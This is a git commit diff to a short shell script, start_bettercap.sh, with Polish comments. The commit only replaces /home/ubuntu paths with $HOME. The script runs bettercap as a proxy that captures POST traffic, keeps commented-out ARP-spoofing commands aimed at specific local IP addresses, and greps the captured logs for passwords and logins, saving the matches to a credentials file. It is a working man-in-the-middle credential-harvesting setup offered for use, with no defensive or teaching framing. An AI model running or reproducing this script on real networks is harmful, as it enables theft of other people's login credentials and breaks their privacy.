b60b44b25b536c84549d239639fb0d0d84fa5bd6
jolo2734 <bartek.matejuk.szkola@gmail.com>
2022-01-23 19:57:12 +0000

    change to /home/ubuntu

--- bettercap/start_bettercap.sh
+++ bettercap/start_bettercap.sh
@@ -2,7 +2,7 @@
 
 #filtrowanie wszystkich przechwytywania
 sudo rm /home/ubuntu/credentials-bettercap/*
-grep -in -E "pass|login|password|user" /home/ubuntu/bettercap-logs/* > /home/ubuntu/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt
+grep -in -E "pass|login|password|user" $HOME/bettercap-logs/* > $HOME/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt
 
 #odpalenie programu bettercap
 #sudo bettercap -I wlan0 -S ARP --gateway 192.168.1.254 -X --proxy-https --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
@@ -12,4 +12,4 @@ grep -in -E "pass|login|password|user" /home/ubuntu/bettercap-logs/* > /home/ubu
 
 #z yt
 #sudo bettercap -T 192.168.1.10,192.168.1.9,192.168.1.17 --proxy --proxy-https -P POST --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
-sudo bettercap --proxy -P POST --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
+sudo bettercap --proxy -P POST --log-timestamp --log $HOME/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
